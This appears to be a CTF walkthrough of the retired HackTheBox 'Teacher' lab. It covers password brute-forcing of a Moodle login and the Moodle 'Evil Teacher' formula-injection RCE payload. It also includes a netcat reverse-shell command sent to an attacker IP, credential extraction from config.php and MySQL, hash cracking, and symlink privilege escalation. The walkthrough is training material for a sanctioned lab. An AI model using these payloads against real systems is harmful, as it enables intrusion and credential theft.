@@ -1,0 +1,136 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Teacher Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-teacher-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-04-24T17:10:42+00:00">April 24, 2019</time><time class="updated" datetime="2025-06-29T08:04:53+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Teacher”. It is a retired vulnerable lab presented by Hack the Box for helping pentesters to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;">Level: Intermediate</span></p>
+<p><span style="color: #000000;">Task: To find user.txt and root.txt file</span></p>
+<p><span style="color: #000000;">Note: Since these labs are online available, therefore, they have a static IP. The IP of Teacher is 10.10.10.153</span></p>
+<h3><span style="color: #800000;">Penetrating Methodology</span></h3>
+<p><span style="color: #000000;"><strong>Scanning </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Nmap)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Web Spidering (dirb)</span></li>
+<li><span style="color: #000000;">Abusing HTTP service</span></li>
+<li><span style="color: #000000;">Password Fuzzing (Wfuzz)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Evil Teacher Attack</span></li>
+<li><span style="color: #000000;">Obtain Netcat session</span></li>
+<li><span style="color: #000000;">Get config.php to obtain the MySQL password</span></li>
+<li><span style="color: #000000;">Connect to MySQL</span></li>
+<li><span style="color: #000000;">Extract tables to obtain login credentials</span></li>
+<li><span style="color: #000000;">Get user.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Symlinking root directory</span></li>
+<li><span style="color: #000000;">Get root.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong><u>Walkthrough </u></strong></span></p>
+<h3><span style="color: #800000;">Scanning</span></h3>
+<p><span style="color: #000000;">Let’s start off with our basic Nmap command to find out the open ports and services.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV -p- 10.10.10.153</pre>
+<p><span style="color: #000000;">As you can observe that it has shown port 80 is open for http services.</span></p>
+<p><img decoding="async" src="//2.bp.blogspot.com/-MDgjVFsmjYY/XMCTu-pkCjI/AAAAAAAAeGE/B8qb_zJruJcLp_gsB2-UqeRrzjYXsE6pwCLcBGAs/s1600/1.png"/></p>
+<p><span style="color: #000000;">We found a school website on exploring port 80, and I didn’t find a lot of information here. This website appears to be designed for online courses and the author may use some educational cms to design it.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="//1.bp.blogspot.com/-oeo0J6rWHvE/XMCTxwuBTiI/AAAAAAAAeGk/qRMfaz0-xrg95_VZ8aQbyRGPAeqxAS-HACLcBGAs/s1600/2.png"/></strong></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Enumeration</span> </span></h3>
+<p><span style="color: #000000;">Since it is a learning site that needs to be designed for online classes using a CMS platform. Therefore, I will go for the enumeration of the web directory without wasting much time.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb //10.10.10.153</pre>
+<p><span style="color: #000000;">If you notice the image below, you will find a web directory /moodle. The website is therefore proven to be designed on MOODLE CMS, let’s explore it further.</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-dIlTQBG72UQ/XMCT1iTGkNI/AAAAAAAAeHM/BQj8gp_JKvEFR5IxS75YJqyymYqxesywACLcBGAs/s1600/3.png"/></p>
+<p><span style="color: #000000;">When I explored /10.10.10.153/moodle, it’s the “<em>Giovanni Chhatta</em>” teacher portal for online classes in Mathematics Algebra. If you’re looking for a moodle exploit, you’re going to see it vulnerable to SQL and RCE. So, to exploit it, we need to log in to this account, but we don’t have credentials.</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-sYgI7F8_qz8/XMCT2NL3RfI/AAAAAAAAeHU/OkLoUYe28iQQToMVVojqIuo68gD99GE9wCLcBGAs/s1600/4.png"/></p>
+<p><span style="color: #000000;">I felt like the photo gallery looks suspicious while spidering because each row contains 4 tiles and one photo in the top left corner is missing.</span></p>
+<p><img decoding="async" src="//2.bp.blogspot.com/-0MY9lHhhNZw/XMCT2xhOyXI/AAAAAAAAeHc/yfkoXXajeNwEvftMGg2LRZY5hgbXFWxlgCLcBGAs/s1600/5.1.png"/></p>
+<p><span style="color: #000000;">Therefore, I check the source code of the page and there is some error where I saw picture 5. We need to download this picture to identify more about image error.</span></p>
+<p><img decoding="async" src="//3.bp.blogspot.com/-nOkZ4Kfqlz0/XMCT27LaHsI/AAAAAAAAeHY/AWnuUf2LHyUY4zb8lzU_oASjBWceoJkVQCLcBGAs/s1600/5.png"/></p>
+<p><span style="color: #000000;">So, I downloaded this image 5 with the help of the wget command and identified the type of file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget //10.10.10.153/images/5.png
+file 5.png</pre>
+<p><span style="color: #000000;">Though it looks like an image, it was ASCII file that we could open in any text editor. As you can see with the help of the cat command, I opened the 5.png file where I found the “Giovanni” user password clue.</span></p>
+<p><span style="color: #000000;">PASSWORD HINT: “<em>I</em> <strong><em>forgot the last character of</em></strong><em> my password. The only part I remembered is <strong>Th4C00lTheacha</strong></em>”</span></p>
+<p><span style="color: #000000;">Since the password’s last character was missing, I created a wordlist with the command below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crunch 15 15 -t Th4C00lTheacha^ -o pass.txt</pre>
+<p><img decoding="async" src="//2.bp.blogspot.com/-n2aAAo3AZDY/XMCT3doHQAI/AAAAAAAAeHg/-2NuFIaC_Kkehn2Y1mL2suDBHt3LFABcgCLcBGAs/s1600/6.png"/></p>
+<p><span style="color: #000000;">Now let use wfuzz for fuzzing brute force using wordlist to identify valid login combination.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic"> wfuzz -w pass.txt -L 20 -d "username=giovanni&amp;password=FUZZ" -hw 1224 //10.10.10.153/moodle/login/index.php</pre>
+<p><span style="color: #000000;">WoW!! We got HTTP 200 ok response for Giovanni: Th4C00lTheacha#</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-S1m2mQ3VeaE/XMCT38D1GHI/AAAAAAAAeHk/vnijAfL3GyM-uuEEe2wqh46krBFPwI1cACLcBGAs/s1600/7.png"/></p>
+<h3><span style="color: #800000;">Exploiting </span></h3>
+<p><span style="color: #000000;">We get inside the dashboard with the help of the above login credential. Now let’s try to exploit if you’re going to google for moodle exploit then it’s going to show you EVIL TEACHER attack which you can read from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="//blog.ripstech.com/2018/moodle-remote-code-execution/">here</a></span></strong>.</span></p>
+<p><img decoding="async" src="//2.bp.blogspot.com/-d4BfsXxEjYQ/XMCT4Ca7XhI/AAAAAAAAeHo/bn-vdXJcVgU2PM3yvH96pOpP8g7qpM9awCLcBGAs/s1600/8.png"/></p>
+<p><span style="color: #000000;">We now need to edit a new activity in order to exploit it, so explore <strong>settings &gt; edit &gt; add an activity or resource</strong>. Now you’re going to get a prompt to select an activity you want to add, I’ve chosen a quiz here.</span></p>
+<p><img decoding="async" src="//3.bp.blogspot.com/-4phSoPrrKTc/XMCT4DxMnXI/AAAAAAAAeHs/83mN_4X9LucNOMR3Cv7P5JsqQjAojlm5QCLcBGAs/s1600/9.png"/></p>
+<p><span style="color: #000000;">Then click on Ethical hacking quiz to add some question inside it.</span></p>
+<p><img decoding="async" src="//1.bp.blogspot.com/--slUQ8UronM/XMCTu_uK-hI/AAAAAAAAeGI/LctA-IXBGj8pKbzEh6UcUpY4-b8n8_mbwCLcBGAs/s1600/10-.png"/></p>
+<p><span style="color: #000000;">Click on Edit option for adding a question.</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-VbSmj6MXptI/XMCTuorocnI/AAAAAAAAeGA/vXgRUpfPHagOj56j_qUv3h2ohWkWh5XdwCLcBGAs/s1600/11.png"/></p>
+<p><span style="color: #000000;">Now click on Add &gt; <strong>+ a new question </strong>which will open a console to add quiz question.</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-50e26alfSyE/XMCTvgHSRwI/AAAAAAAAeGM/cG3QbLChMIocL8gcmT9OAI0o-R0ezyUFwCLcBGAs/s1600/12.png"/></p>
+<p><span style="color: #000000;">Choose “calculated” the question type to add.</span></p>
+<p><img decoding="async" src="//1.bp.blogspot.com/-AIJ2Svz6Beo/XMCTwJkQpTI/AAAAAAAAeGQ/XIamdVJc_IUsotr7R2T2HK4fHRW7u5hOwCLcBGAs/s1600/13.png"/></p>
+<p><span style="color: #000000;">Now, when you ask a question, you need to mention the answer in the given text area, but this is vulnerable to EVIL TEACHER attack. Now get the reverse shell we insert a formula in the filed text given to write the answer and then click on save the changes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">1?&gt;&lt;?=log(1){a.`$_GET[0]`.({x})}?&gt;</pre>
+<p><img decoding="async" src="//3.bp.blogspot.com/-gXkdCzIpd7c/XMCTwH_tx9I/AAAAAAAAeGU/4-TRu9MTlTsxn1nNbeFaS40bXcc23MVoQCLcBGAs/s1600/14.png"/></p>
+<p><span style="color: #000000;">Start netcat in the local machine and then inject netcat reverse shell payload in the URL as shown in the image, click on next page:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
+&amp;0(data;nc -e /bin/bash &lt;attacker-IP&gt; &lt;listening port&gt;)</pre>
+<p><img decoding="async" src="//4.bp.blogspot.com/-PgISr3eEHQ8/XMCa3kBrjyI/AAAAAAAAeIM/-fTeahZYAEEWT8Vhcg4eZqZ40DFQ78QKwCLcBGAs/s1600/15.png"/></p>
+<p><span style="color: #000000;">Repeat the same to inject nc payload once again and execute the URL to get a netcat session.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&amp;0(data;nc -e /bin/bash &lt;attacker-IP&gt; &lt;listening port&gt;)</pre>
+<p><span style="color: #000000;">You can see here that we pwned the target machine’s web shell, let’s explore more to get user.txt and root.txt. So, I check the directory list inside /moodle here that I found a config.php file.</span></p>
+<p><img decoding="async" src="//3.bp.blogspot.com/-Gy1WabZIILU/XMCTxC9Vp7I/AAAAAAAAeGg/Bp6zGpHWuMMJSi_-QtXbfdwjHvylmJFhwCLcBGAs/s1600/17.png"/></p>
+<p><span style="color: #000000;">I saw mysql login credential inside the config.php file as shown below.</span></p>
+<p><img decoding="async" src="//3.bp.blogspot.com/-lwNPXn8GWLQ/XMCTxykTBaI/AAAAAAAAeGo/27qky2N7ivAMclMJML9fs5wH_Vus52VoACLcBGAs/s1600/21.png"/></p>
+<h5><span style="color: #000000;">Connect to MySQL</span></h5>
+<p><span style="color: #000000;">Connect to MySQL to extract information from the database such as credentials for system login.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mysql -u root -p'Welkom1' moodle
+show tables;</pre>
+<p><img decoding="async" src="//1.bp.blogspot.com/-qwmiESkgbtM/XMCTyDqIFLI/AAAAAAAAeGs/Awk9PemOEjIoacKRkHVqsOZ3ir_YpqOwwCLcBGAs/s1600/22.png"/></p>
+<p><span style="color: #000000;">Here mdl_user table looks more interesting, let’s extract its column information in the hop to get some useful information.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">show columns from mdl_user;</pre>
+<p><span style="color: #000000;">WOW! WOW!! It includes the username and column of the password, let’s explore it.</span></p>
+<p><img decoding="async" src="//3.bp.blogspot.com/-lS-KcIcHirQ/XMCTyymB-NI/AAAAAAAAeGw/_SOP5wvxhxE7XTtj3zmivz05xYURKWdNACLcBGAs/s1600/23.png"/></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">select user,password from mdl_user;</pre>
+<p><span style="color: #000000;">Here I found 4 users with the md5 hash value, let’s try cracking them.</span></p>
+<p><img decoding="async" src="//2.bp.blogspot.com/-eryiXnzrAuY/XMCTzskrJ9I/AAAAAAAAeG4/Rn6Amt_Od3klCzCMwDsWMl9KmFpPVq3qgCLcBGAs/s1600/24.png"/></p>
+<p><span style="color: #000000;">So, we got the password “expelled” by using the online md5 decryption tool.</span></p>
+<p><img decoding="async" src="//2.bp.blogspot.com/-GaVYTq6IfyA/XMCTzTq96WI/AAAAAAAAeG0/Hy1R0sSt4tk5ngvV8kbbZa6zpmPbJiQ5ACLcBGAs/s1600/25.png"/></p>
+<p><span style="color: #000000;">Now use the credentials above and switch user account to try to locate the user.txt file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su Giovanni
+password: expelled
+ls
+cat user.txt</pre>
+<p><span style="color: #000000;">Yeah! Yeah. We got our 1st flag successfully, now let’s find out about root.txt, but as we know it needs an escalation of privilege.</span></p>
+<p><img decoding="async" src="//1.bp.blogspot.com/-jlf4enIZFlE/XMCTz3GAj7I/AAAAAAAAeG8/3C4iCxfnmJwEqXtYNHAvm2i1I5xmpRgMQCLcBGAs/s1600/26.png"/></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Privilege Escalation</span> </span></h3>
+<p><span style="color: #000000;">So, while traversing, I found a backup_course.tar file inside /home/giovanni/work/tmp</span></p>
+<p><img decoding="async" src="//1.bp.blogspot.com/-jlf4enIZFlE/XMCTz3GAj7I/AAAAAAAAeG8/3C4iCxfnmJwEqXtYNHAvm2i1I5xmpRgMQCLcBGAs/s1600/26.png"/></p>
+<p><span style="color: #000000;">I found a backup _course.tar file inside /home/giovanni/work/tmp while traversing.</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-pLzq-0qyLN0/XMCT0c2eZiI/AAAAAAAAeHA/vyxjZHN2Z7Y44Woyxnozhxl0cVThw5cHQCLcBGAs/s1600/28.png"/></p>
+<p><span style="color: #000000;">Therefore, since the current directory has full permission, I try to link the root directory within the /tmp folder so that we can get backup of the root directory within the /tmp folder with the help of backup.sh.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ln -s /root tmp</pre>
+<p><img decoding="async" src="//2.bp.blogspot.com/-BwwAxw_CwvU/XMCT0xKpsgI/AAAAAAAAeHI/v-Ab8GRN7cQGsg-TixbInabKthq9n3KjQCLcBGAs/s1600/29.png"/></p>
+<p><span style="color: #000000;">Fantastic!! I found /root directory within /tmp after 1-2 minutes, which means that without root access we can get the root.txt file as shown below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+ls
+cd /root
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;">Booom!! We found root.txt successfully!!!!!!!!!!!</span></p>
+<p><img decoding="async" src="//4.bp.blogspot.com/-ROU9rPSVjts/XMCT181qdJI/AAAAAAAAeHQ/_4oe73zNTR8p1ieWUtupD4hSWWAPSh8iQCLcBGAs/s1600/30.png"/></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><strong><a href="https://www.linkedin.com/in/aarti--singh/"><span style="color: #000000;"> </span>here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
